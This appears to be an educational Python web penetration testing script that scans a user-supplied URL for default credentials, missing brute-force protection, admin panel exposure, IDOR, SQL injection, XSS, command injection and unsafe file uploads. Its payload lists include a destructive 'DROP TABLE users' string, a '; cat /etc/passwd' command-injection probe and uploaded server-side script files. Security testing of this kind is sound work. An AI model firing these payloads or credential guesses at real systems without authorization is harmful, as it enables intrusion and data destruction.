#!/usr/bin/env python3
"""
EDUCATIONAL PURPOSE ONLY - Web Application Penetration Testing Tutorial
This tutorial demonstrates comprehensive web application penetration testing techniques.

LEGAL DISCLAIMER:
This code is for educational purposes only. Use only on systems you own or have explicit permission to test.
Unauthorized access to computer systems is illegal and unethical.
"""

import requests
import re
import json
import base64
import hashlib
import time
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import threading
from concurrent.futures import ThreadPoolExecutor

class WebAppPenetrationTesting:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.found_forms = []
        self.found_parameters = []
        
    def information_gathering(self):
        """
        Information Gathering Phase
        Collects information about the target web application
        """
        print("=== Information Gathering Phase ===")
        
        try:
            print(f"Target: {self.target_url}")
            
            # Basic request
            response = self.session.get(self.target_url)
            print(f"Status Code: {response.status_code}")
            print(f"Server: {response.headers.get('Server', 'Not specified')}")
            print(f"Content-Type: {response.headers.get('Content-Type', 'Not specified')}")
            
            # Check for interesting headers
            interesting_headers = [
                'X-Powered-By', 'X-AspNet-Version', 'X-Frame-Options',
                'Content-Security-Policy', 'Strict-Transport-Security',
                'X-Content-Type-Options', 'X-XSS-Protection'
            ]
            
            print("\nSecurity Headers:")
            for header in interesting_headers:
                value = response.headers.get(header)
                if value:
                    print(f"  {header}: {value}")
                else:
                    print(f"  {header}: Not present")
            
            # Analyze response content
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            forms = soup.find_all('form')
            print(f"\nFound {len(forms)} forms")
            
            for i, form in enumerate(forms):
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                inputs = form.find_all(['input', 'textarea', 'select'])
                for inp in inputs:
                    form_info['inputs'].append({
                        'name': inp.get('name', ''),
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', '')
                    })
                
                self.found_forms.append(form_info)
                print(f"Form {i+1}: {form_info['method']} {form_info['action']}")
                print(f"  Inputs: {[inp['name'] for inp in form_info['inputs']]}")
            
            # Find links and parameters
            links = soup.find_all('a', href=True)
            print(f"\nFound {len(links)} links")
            
            # Extract parameters from URLs
            for link in links:
                href = link['href']
                if '?' in href:
                    params = parse_qs(urlparse(href).query)
                    for param in params:
                        if param not in self.found_parameters:
                            self.found_parameters.append(param)
            
            print(f"Found parameters: {self.found_parameters}")
            
            # Technology detection
            self.technology_detection(response)
            
        except Exception as e:
            print(f"Information gathering failed: {e}")
    
    def technology_detection(self, response):
        """
        Detect web technologies and frameworks
        """
        print("\n=== Technology Detection ===")
        
        content = response.text.lower()
        headers = response.headers
        
        technologies = []
        
        # Server detection
        server = headers.get('Server', '').lower()
        if 'apache' in server:
            technologies.append('Apache')
        elif 'nginx' in server:
            technologies.append('Nginx')
        elif 'iis' in server:
            technologies.append('IIS')
        
        # Framework detection
        powered_by = headers.get('X-Powered-By', '').lower()
        if 'php' in powered_by:
            technologies.append('PHP')
        elif 'asp.net' in powered_by:
            technologies.append('ASP.NET')
        elif 'express' in powered_by:
            technologies.append('Express.js')
        
        # CMS detection
        if 'wordpress' in content:
            technologies.append('WordPress')
        elif 'drupal' in content:
            technologies.append('Drupal')
        elif 'joomla' in content:
            technologies.append('Joomla')
        
        # JavaScript frameworks
        if 'react' in content:
            technologies.append('React')
        elif 'angular' in content:
            technologies.append('Angular')
        elif 'vue' in content:
            technologies.append('Vue.js')
        
        print(f"Detected technologies: {', '.join(technologies) if technologies else 'Unknown'}")
        
        return technologies
    
    def authentication_testing(self):
        """
        Authentication Testing Phase
        Tests authentication mechanisms for vulnerabilities
        """
        print("\n=== Authentication Testing Phase ===")
        
        # Test for default credentials
        print("1. Default Credentials Testing:")
        default_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest')
        ]
        
        for username, password in default_credentials:
            if self.test_login(username, password):
                self.vulnerabilities.append({
                    'type': 'Default Credentials',
                    'severity': 'High',
                    'description': f'Default credentials work: {username}:{password}'
                })
                print(f"⚠️  VULNERABILITY: Default credentials work - {username}:{password}")
                break
        else:
            print("✅ No default credentials found")
        
        # Test for weak password policy
        print("\n2. Password Policy Testing:")
        weak_passwords = ['password', '123456', 'admin', 'test', 'qwerty']
        
        for password in weak_passwords:
            if self.test_login('testuser', password):
                self.vulnerabilities.append({
                    'type': 'Weak Password Policy',
                    'severity': 'Medium',
                    'description': f'Weak password accepted: {password}'
                })
                print(f"⚠️  VULNERABILITY: Weak password accepted - {password}")
                break
        else:
            print("✅ Strong password policy enforced")
        
        # Test for account enumeration
        print("\n3. Account Enumeration Testing:")
        self.account_enumeration_test()
        
        # Test for brute force protection
        print("\n4. Brute Force Protection Testing:")
        self.brute_force_protection_test()
    
    def test_login(self, username, password):
        """
        Test login credentials
        """
        for form in self.found_forms:
            if form['method'] == 'POST':
                login_data = {}
                for inp in form['inputs']:
                    if inp['type'] == 'password':
                        login_data[inp['name']] = password
                    elif 'user' in inp['name'].lower() or 'email' in inp['name'].lower():
                        login_data[inp['name']] = username
                
                try:
                    action_url = urljoin(self.target_url, form['action'])
                    response = self.session.post(action_url, data=login_data)
                    
                    # Check for successful login indicators
                    if 'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
                        return True
                    if response.status_code == 302 and 'login' not in response.url:
                        return True
                        
                except Exception:
                    pass
        
        return False
    
    def account_enumeration_test(self):
        """
        Test for account enumeration vulnerabilities
        """
        test_usernames = ['admin', 'administrator', 'test', 'user', 'guest', 'root']
        
        for username in test_usernames:
            # Test with wrong password
            response1 = self.test_login_response(username, 'wrongpassword')
            
            # Test with non-existent username
            response2 = self.test_login_response('nonexistentuser', 'wrongpassword')
            
            if response1 and response2 and response1 != response2:
                self.vulnerabilities.append({
                    'type': 'Account Enumeration',
                    'severity': 'Medium',
                    'description': f'Account enumeration possible for user: {username}'
                })
                print(f"⚠️  VULNERABILITY: Account enumeration possible - {username}")
                return
        
        print("✅ No account enumeration vulnerability detected")
    
    def test_login_response(self, username, password):
        """
        Get login response for analysis
        """
        for form in self.found_forms:
            if form['method'] == 'POST':
                login_data = {}
                for inp in form['inputs']:
                    if inp['type'] == 'password':
                        login_data[inp['name']] = password
                    elif 'user' in inp['name'].lower() or 'email' in inp['name'].lower():
                        login_data[inp['name']] = username
                
                try:
                    action_url = urljoin(self.target_url, form['action'])
                    response = self.session.post(action_url, data=login_data)
                    return response.text
                except Exception:
                    pass
        
        return None
    
    def brute_force_protection_test(self):
        """
        Test for brute force protection
        """
        print("Testing brute force protection...")
        
        # Attempt multiple failed logins
        for i in range(10):
            response = self.test_login_response('admin', f'wrongpassword{i}')
            
            if response and 'locked' in response.lower():
                print("✅ Brute force protection detected")
                return
            elif response and 'captcha' in response.lower():
                print("✅ CAPTCHA protection detected")
                return
        
        self.vulnerabilities.append({
            'type': 'No Brute Force Protection',
            'severity': 'Medium',
            'description': 'No brute force protection mechanism detected'
        })
        print("⚠️  VULNERABILITY: No brute force protection detected")
    
    def authorization_testing(self):
        """
        Authorization Testing Phase
        Tests access control mechanisms
        """
        print("\n=== Authorization Testing Phase ===")
        
        # Test for horizontal privilege escalation
        print("1. Horizontal Privilege Escalation Testing:")
        self.test_horizontal_escalation()
        
        # Test for vertical privilege escalation
        print("\n2. Vertical Privilege Escalation Testing:")
        self.test_vertical_escalation()
        
        # Test for direct object references
        print("\n3. Insecure Direct Object Reference Testing:")
        self.test_idor()
    
    def test_horizontal_escalation(self):
        """
        Test for horizontal privilege escalation
        """
        # This would require authenticated sessions with different users
        print("Note: Horizontal escalation testing requires multiple user accounts")
        print("In a real scenario, you would:")
        print("1. Create two user accounts")
        print("2. Access user1's data while logged in as user2")
        print("3. Verify if access is properly restricted")
    
    def test_vertical_escalation(self):
        """
        Test for vertical privilege escalation
        """
        # Test for admin functionality access
        admin_urls = ['/admin', '/administrator', '/panel', '/dashboard']
        
        for url in admin_urls:
            try:
                full_url = urljoin(self.target_url, url)
                response = self.session.get(full_url)
                
                if response.status_code == 200 and 'admin' in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'Vertical Privilege Escalation',
                        'severity': 'High',
                        'description': f'Admin panel accessible: {url}'
                    })
                    print(f"⚠️  VULNERABILITY: Admin panel accessible - {url}")
                    
            except Exception:
                pass
        else:
            print("✅ No admin panel access vulnerability detected")
    
    def test_idor(self):
        """
        Test for Insecure Direct Object References
        """
        # Test for predictable object IDs
        test_ids = ['1', '2', '3', '100', '1000', 'admin', 'test']
        
        for test_id in test_ids:
            # Test common IDOR patterns
            idor_urls = [
                f'/user/{test_id}',
                f'/profile/{test_id}',
                f'/document/{test_id}',
                f'/file/{test_id}',
                f'/api/users/{test_id}',
                f'/api/profile/{test_id}'
            ]
            
            for url in idor_urls:
                try:
                    full_url = urljoin(self.target_url, url)
                    response = self.session.get(full_url)
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        self.vulnerabilities.append({
                            'type': 'Insecure Direct Object Reference',
                            'severity': 'Medium',
                            'description': f'IDOR vulnerability: {url}'
                        })
                        print(f"⚠️  VULNERABILITY: IDOR detected - {url}")
                        
                except Exception:
                    pass
    
    def input_validation_testing(self):
        """
        Input Validation Testing Phase
        Tests for various input validation vulnerabilities
        """
        print("\n=== Input Validation Testing Phase ===")
        
        # Test for SQL injection
        print("1. SQL Injection Testing:")
        self.test_sql_injection()
        
        # Test for XSS
        print("\n2. Cross-Site Scripting (XSS) Testing:")
        self.test_xss()
        
        # Test for command injection
        print("\n3. Command Injection Testing:")
        self.test_command_injection()
        
        # Test for file upload vulnerabilities
        print("\n4. File Upload Testing:")
        self.test_file_upload()
    
    def test_sql_injection(self):
        """
        Test for SQL injection vulnerabilities
        """
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
        ]
        
        for form in self.found_forms:
            for payload in sql_payloads:
                if self.test_form_with_payload(form, payload, 'sql'):
                    return
        
        print("✅ No SQL injection vulnerabilities detected")
    
    def test_xss(self):
        """
        Test for XSS vulnerabilities
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for form in self.found_forms:
            for payload in xss_payloads:
                if self.test_form_with_payload(form, payload, 'xss'):
                    return
        
        print("✅ No XSS vulnerabilities detected")
    
    def test_command_injection(self):
        """
        Test for command injection vulnerabilities
        """
        cmd_payloads = [
            "; ls",
            "| whoami",
            "&& id",
            "; cat /etc/passwd",
            "| dir",
            "&& type C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for form in self.found_forms:
            for payload in cmd_payloads:
                if self.test_form_with_payload(form, payload, 'cmd'):
                    return
        
        print("✅ No command injection vulnerabilities detected")
    
    def test_form_with_payload(self, form, payload, vuln_type):
        """
        Test a form with a specific payload
        """
        try:
            form_data = {}
            for inp in form['inputs']:
                if inp['type'] == 'password':
                    form_data[inp['name']] = payload
                elif inp['type'] == 'text' or inp['type'] == 'email':
                    form_data[inp['name']] = payload
                else:
                    form_data[inp['name']] = inp['value']
            
            action_url = urljoin(self.target_url, form['action'])
            
            if form['method'] == 'POST':
                response = self.session.post(action_url, data=form_data)
            else:
                response = self.session.get(action_url, params=form_data)
            
            # Check for vulnerability indicators
            if vuln_type == 'sql':
                if 'mysql' in response.text.lower() or 'sql' in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'description': f'SQL injection detected with payload: {payload}'
                    })
                    print(f"⚠️  VULNERABILITY: SQL injection detected - {payload}")
                    return True
            
            elif vuln_type == 'xss':
                if '<script>' in response.text and 'alert' in response.text:
                    self.vulnerabilities.append({
                        'type': 'Cross-Site Scripting',
                        'severity': 'High',
                        'description': f'XSS detected with payload: {payload}'
                    })
                    print(f"⚠️  VULNERABILITY: XSS detected - {payload}")
                    return True
            
            elif vuln_type == 'cmd':
                if 'uid=' in response.text or 'gid=' in response.text or 'Volume in drive' in response.text:
                    self.vulnerabilities.append({
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'description': f'Command injection detected with payload: {payload}'
                    })
                    print(f"⚠️  VULNERABILITY: Command injection detected - {payload}")
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def test_file_upload(self):
        """
        Test for file upload vulnerabilities
        """
        # Look for file upload forms
        upload_forms = []
        for form in self.found_forms:
            for inp in form['inputs']:
                if inp['type'] == 'file':
                    upload_forms.append(form)
                    break
        
        if not upload_forms:
            print("✅ No file upload functionality found")
            return
        
        print(f"Found {len(upload_forms)} file upload forms")
        
        # Test malicious file uploads
        malicious_files = [
            ('test.php', '<?php echo "Hello World"; ?>'),
            ('test.jsp', '<% out.println("Hello World"); %>'),
            ('test.asp', '<% Response.Write("Hello World") %>'),
            ('test.html', '<script>alert("XSS")</script>'),
        ]
        
        for form in upload_forms:
            for filename, content in malicious_files:
                if self.test_file_upload_form(form, filename, content):
                    return
        
        print("✅ No file upload vulnerabilities detected")
    
    def test_file_upload_form(self, form, filename, content):
        """
        Test file upload form with malicious file
        """
        try:
            form_data = {}
            files = {}
            
            for inp in form['inputs']:
                if inp['type'] == 'file':
                    files[inp['name']] = (filename, content, 'application/octet-stream')
                else:
                    form_data[inp['name']] = inp['value']
            
            action_url = urljoin(self.target_url, form['action'])
            response = self.session.post(action_url, data=form_data, files=files)
            
            # Check if file was uploaded successfully
            if response.status_code == 200 and 'success' in response.text.lower():
                # Try to access the uploaded file
                file_url = urljoin(self.target_url, f'/uploads/{filename}')
                file_response = self.session.get(file_url)
                
                if file_response.status_code == 200 and content in file_response.text:
                    self.vulnerabilities.append({
                        'type': 'File Upload Vulnerability',
                        'severity': 'High',
                        'description': f'Malicious file uploaded and accessible: {filename}'
                    })
                    print(f"⚠️  VULNERABILITY: File upload vulnerability - {filename}")
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def session_management_testing(self):
        """
        Session Management Testing Phase
        Tests session management mechanisms
        """
        print("\n=== Session Management Testing Phase ===")
        
        # Test for session fixation
        print("1. Session Fixation Testing:")
        self.test_session_fixation()
        
        # Test for session timeout
        print("\n2. Session Timeout Testing:")
        self.test_session_timeout()
        
        # Test for secure session cookies
        print("\n3. Secure Session Cookies Testing:")
        self.test_secure_cookies()
    
    def test_session_fixation(self):
        """
        Test for session fixation vulnerabilities
        """
        # Get initial session
        response1 = self.session.get(self.target_url)
        session1 = self.session.cookies.get('sessionid') or self.session.cookies.get('PHPSESSID')
        
        # Login (if possible)
        # This would require valid credentials
        print("Note: Session fixation testing requires valid login credentials")
        print("In a real scenario, you would:")
        print("1. Capture session ID before login")
        print("2. Login with valid credentials")
        print("3. Check if session ID changed after login")
    
    def test_session_timeout(self):
        """
        Test for session timeout
        """
        print("Note: Session timeout testing requires authenticated session")
        print("In a real scenario, you would:")
        print("1. Login with valid credentials")
        print("2. Wait for session timeout period")
        print("3. Try to access protected resource")
        print("4. Verify if session is properly invalidated")
    
    def test_secure_cookies(self):
        """
        Test for secure cookie settings
        """
        response = self.session.get(self.target_url)
        cookies = self.session.cookies
        
        for cookie in cookies:
            cookie_name = cookie.name
            
            # Check for secure flag
            if not cookie.secure:
                self.vulnerabilities.append({
                    'type': 'Insecure Cookie',
                    'severity': 'Medium',
                    'description': f'Cookie {cookie_name} missing secure flag'
                })
                print(f"⚠️  VULNERABILITY: Cookie {cookie_name} missing secure flag")
            
            # Check for httpOnly flag
            # Note: requests library doesn't expose httpOnly flag directly
            print(f"Cookie {cookie_name}: secure={cookie.secure}")
    
    def generate_report(self):
        """
        Generate penetration testing report
        """
        print("\n=== Penetration Testing Report ===")
        print(f"Target: {self.target_url}")
        print(f"Total vulnerabilities found: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\nVulnerabilities:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   Severity: {vuln['severity']}")
                print(f"   Description: {vuln['description']}")
        else:
            print("\n✅ No critical vulnerabilities found")
        
        # Recommendations
        print("\n=== Recommendations ===")
        print("1. Implement proper input validation and output encoding")
        print("2. Use parameterized queries to prevent SQL injection")
        print("3. Implement Content Security Policy (CSP)")
        print("4. Use secure session management")
        print("5. Implement proper authentication and authorization")
        print("6. Regular security testing and code reviews")
    
    def run_penetration_test(self):
        """
        Run complete web application penetration test
        """
        print("🔒 Web Application Penetration Testing - Educational Purpose Only")
        print("=" * 70)
        
        try:
            # Phase 1: Information Gathering
            self.information_gathering()
            
            # Phase 2: Authentication Testing
            self.authentication_testing()
            
            # Phase 3: Authorization Testing
            self.authorization_testing()
            
            # Phase 4: Input Validation Testing
            self.input_validation_testing()
            
            # Phase 5: Session Management Testing
            self.session_management_testing()
            
            # Generate report
            self.generate_report()
            
        except Exception as e:
            print(f"❌ Error during penetration testing: {e}")
        
        print("\n" + "=" * 70)
        print("✅ Penetration testing completed!")
        print("Remember: Always use these techniques responsibly and legally!")

def main():
    """
    Main function to run web application penetration testing
    """
    print("Web Application Penetration Testing - Educational Purpose Only")
    print("⚠️  WARNING: Use only on systems you own or have explicit permission to test!")
    
    # Get target URL
    target_url = input("Enter target URL (or press Enter for http://localhost:8080): ").strip()
    if not target_url:
        target_url = "http://localhost:8080"
    
    # Run penetration test
    pentest = WebAppPenetrationTesting(target_url)
    pentest.run_penetration_test()

if __name__ == "__main__":
    main()

